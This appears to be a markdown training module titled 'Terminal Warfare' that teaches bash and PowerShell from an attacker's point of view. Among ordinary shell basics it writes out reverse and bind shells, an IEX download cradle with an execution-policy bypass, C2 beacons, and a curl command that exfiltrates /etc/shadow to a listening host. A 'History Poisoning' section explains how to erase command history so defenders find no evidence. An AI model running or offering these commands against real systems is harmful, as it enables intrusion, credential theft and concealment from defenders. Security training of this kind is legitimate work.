# MODULE 00: TERMINAL WARFARE

## First Principle
The terminal is your weapon. Every command is a round. The shell is the chamber. Learn to load, aim, and fire without thinking.

---

## Section 1: Shell Basics — bash vs PowerShell

### When to use which

| Task | bash (Linux) | PowerShell (Windows) |
|------|-------------|----------------------|
| File ops | `ls`, `cat`, `grep` | `Get-ChildItem`, `Get-Content`, `Select-String` |
| Network | `nc`, `curl`, `ssh` | `Test-NetConnection`, `Invoke-WebRequest` |
| Processes | `ps`, `kill` | `Get-Process`, `Stop-Process` |
| Scripting | `.sh` | `.ps1` |

### The attacker's shell

```bash
# bash — your Linux C2 server
nc -lvnp 4444                    # Listen for reverse shell
bash -i >& /dev/tcp/192.168.1.92/4444 0>&1  # Reverse shell one-liner
```

```powershell
# PowerShell — your Windows target
powershell -ep bypass            # Execution policy bypass
IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.92/a.ps1')  # Download cradle
```

---

## Section 2: File Ops — Navigate, Find, Grep, Pipe

### bash
```bash
find / -name "*.conf" 2>/dev/null    # Find config files
grep -r "password" /var/www/         # Search for secrets
cat access.log | grep "404" | wc -l  # Count 404s
```

### PowerShell
```powershell
Get-ChildItem -Recurse -Filter "*.conf"  # Find config files
Select-String -Path "C:\Users\*" -Pattern "password"  # Search for secrets
Get-Content access.log | Select-String "404" | Measure-Object  # Count 404s
```

---

## Section 3: netcat — The Attacker's Swiss Army Knife

### Bind shell (target listens, you connect)
```bash
# Target
nc -lvnp 4444 -e /bin/bash

# Attacker
nc 192.168.1.42 4444
```

### Reverse shell (target connects to you)
```bash
# Attacker
nc -lvnp 4444

# Target
nc 192.168.1.92 4444 -e /bin/bash
```

### File transfer
```bash
# Send file
nc -w 3 192.168.1.92 4444 < secret.zip

# Receive file
nc -lvnp 4444 > secret.zip
```

---

## Section 4: curl/wget — HTTP as a Weapon

### Download cradle
```bash
curl -o payload.exe http://192.168.1.92/payload.exe
wget http://192.168.1.92/payload.exe -O payload.exe
```

### C2 callback
```bash
curl -X POST http://192.168.1.92:8080/beacon \
  -H "Content-Type: application/json" \
  -d '{"hostname":"'$(hostname)'","user":"'$(whoami)'"}'
```

### Exfil via HTTP
```bash
curl -X POST http://192.168.1.92:8080/exfil \
  --data-binary @/etc/shadow
```

---

## Section 5: ssh — Port Forwarding, Tunneling, SOCKS

### Local port forward (your port → target's port)
```bash
ssh -L 8080:internal.target.com:80 user@jumpbox
# Now browse localhost:8080 to reach internal.target.com:80
```

### Remote port forward (target's port → your port)
```bash
ssh -R 4444:localhost:4444 user@192.168.1.92
# Target's 4444 forwards to your 4444
```

### Dynamic SOCKS proxy
```bash
ssh -D 1080 user@jumpbox
# Configure browser/proxychains to use SOCKS5 localhost:1080
```

### Proxy chains
```bash
proxychains nmap -sT 10.0.0.0/24
# Route nmap through SOCKS proxy
```

---

## Section 6: Process Management

### bash
```bash
ps aux | grep python           # Find Python processes
kill -9 1234                   # Force kill PID 1234
nohup python server.py &      # Background, survive logout
```

### PowerShell
```powershell
Get-Process | Where-Object {$_.ProcessName -like "*python*"}  # Find Python
Stop-Process -Id 1234 -Force                                # Force kill
Start-Process python -ArgumentList "server.py" -NoNewWindow # Background
```

---

## Section 7: History Poisoning

### bash — disable history
```bash
unset HISTFILE              # Stop writing to .bash_history
HISTFILE=/dev/null          # Redirect to void
history -c                  # Clear current session history
```

### PowerShell — disable transcript
```powershell
Set-PSReadlineOption -HistorySaveStyle SaveNothing
Clear-History
```

### Why it matters
Every command you type is evidence. The defender reads `.bash_history` and PowerShell transcripts. You leave nothing or you leave lies.

---

## Section 8: Living in the Shell — tmux, Persistence

### tmux (Linux)
```bash
tmux new -s ops              # New session named "ops"
tmux detach                  # Detach, keep running
tmux attach -t ops           # Reattach later
tmux ls                      # List sessions
```

### Why tmux
Your C2 session dies if your SSH connection drops. tmux keeps the shell alive server-side. Reattach from anywhere.

### Windows equivalent
```powershell
# No tmux on Windows. Use screen on Linux C2, or:
# PowerShell jobs
Start-Job -ScriptBlock { while ($true) { Invoke-RestMethod http://192.168.1.92:8080/beacon; Start-Sleep 60 } }
Get-Job                      # List jobs
Receive-Job -Id 1            # Get output
```

---

## Lab: Terminal Survival

1. Open PowerShell as admin
2. `cd C:\Users\Public`
3. `mkdir 22SD-test`
4. `echo "test" > file.txt`
5. `cat file.txt`
6. `ipconfig | findstr IPv4`
7. `netstat -an | findstr :443`
8. `whoami /priv`
9. `Start-Process notepad -WindowStyle Hidden`
10. `Get-Process notepad | Stop-Process`

All commands worked? You can survive the terminal. Move to Module 01.

---

## Quick Reference Card

| Command | Purpose |
|---------|---------|
| `pwd` | Where am I |
| `ls` / `dir` | What's here |
| `cd` | Move around |
| `mkdir` / `rm` | Create / delete |
| `python` | Run Python |
| `ipconfig` | Network config |
| `ping` / `tracert` | Test connectivity |
| `netstat` | Show ports |
| `whoami` | Who am I |
| `Get-Process` / `tasklist` | Show processes |
| `Stop-Process` / `taskkill` | Kill process |
| `>` / `>>` / `|` | Redirect / pipe |
| `icacls` | File permissions |
| `nc` | netcat — Swiss Army knife |
| `curl` / `wget` | HTTP weapon |
| `ssh` | Tunnel, proxy, forward |
| `tmux` | Persistent sessions |
| `nohup` | Background jobs |
| `history -c` | Clear evidence |

---

*Module 00 — Terminal Warfare. Master the shell before you break it.*
